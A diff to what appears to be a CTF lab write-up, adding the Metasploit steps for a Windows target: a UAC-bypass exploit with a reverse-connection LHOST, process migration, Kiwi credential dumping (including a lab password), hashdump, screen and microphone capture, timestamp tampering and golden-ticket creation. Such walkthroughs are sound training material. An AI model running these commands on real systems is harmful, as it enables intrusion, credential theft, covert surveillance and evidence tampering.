@@ -149,13 +149,121 @@ run post/multi/recon/local_exploit_suggester
 exploit/windows/local/bypassuac_eventvwr
 ```
 
+## oh sry my machine got expired
+
 ### Now we have an exploit let backgound this session using 
 ```
 ctrl + z
 ```
-### So. let run the exploit we found
+![image](https://github.com/user-attachments/assets/7c348c05-8a42-436d-a556-2946f805e2c2)
+
+### But before running use command back to back from previous exploit
+```
+back
+```
+![image](https://github.com/user-attachments/assets/17b468ba-07ba-4ed2-81a3-d010921e7e9e)
+
+### So, let run the exploit we found.
 ```
 use exploit/windows/local/bypassuac_eventvwr
 ```
+![image](https://github.com/user-attachments/assets/48fe5f45-3065-4835-8639-d057e9dc6405)
 
-## oh sry my machine got expired
+### Now let see options this exploit
+```
+show options
+```
+![image](https://github.com/user-attachments/assets/a9d3c6da-4e91-4d40-9814-4e9723666964)
+
+### We need to change the LHOST and Set the Sessions
+* #### Let set Lhost 
+```
+set LHOST 10.17.120.99
+```
+* ### Set session
+```
+set session 1
+```
+![image](https://github.com/user-attachments/assets/090bcc50-7b3c-4d20-bca4-c5e0822fca4b)
+
+* ### let run this exploit
+```
+run
+```
+### The exploit ran successfully.
+
+![image](https://github.com/user-attachments/assets/e1754257-de53-47fe-a2ac-b47b155a3f02)
+
+### Let check permission listed allows us to take ownership of files?
+```
+getprivs
+```
+![image](https://github.com/user-attachments/assets/c8f24c11-58d3-4e74-9ab9-80f9a4cb6c32)
+
+### SeTakeOwnershipPrivilege allow us to take ownership.
+
+## <div align="center"> Task 5 Looting</div>
+
+## Let list the process uisng command:
+```
+ps
+```
+
+![image](https://github.com/user-attachments/assets/d3cad140-e1bf-4a16-b8eb-d61dec68df4c)
+
+### We were going to migrate the process run by admin.
+```
+migrate -N spoolsv.exe
+```
+
+![image](https://github.com/user-attachments/assets/b3072cee-555e-4458-b114-769c021485ea)
+
+
+### After migratre check for uid, as we sucessfully migrated and we are noW NT AUTHORITY.
+
+### Let loot the site 
+```
+load kiwi
+```
+* ###  Kiwi extensions to perform various types of credential-oriented operations, such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and much more.
+![image](https://github.com/user-attachments/assets/e61fc830-fb43-4d0a-a7a9-2b8ae6237c12)
+
+### We can use help command to get help of kiwi.
+### So first we going to Retrieve all credentials.
+```
+creds_all
+```
+
+![image](https://github.com/user-attachments/assets/442eb822-c961-4845-839d-2cd9eb6e9b0a)
+
+* ### The password for dark is ```Password01!```.
+
+## <div align="center">Task 6. Post-Exploitation</div>
+
+### Let dump all the passwords.
+```
+hashdump
+```
+
+### We can also share the screen of target using 
+```
+screenshare
+```
+
+![image](https://github.com/user-attachments/assets/8774abf3-f319-4e73-9ef9-919e47fa2438)
+
+### We can even record from a microphone attached to the system using command.
+```
+record_mic
+```
+
+### To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?
+```
+timestomp
+```
+### Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
+```
+golden_ticket_create
+```
+
+## Thankyou 😄
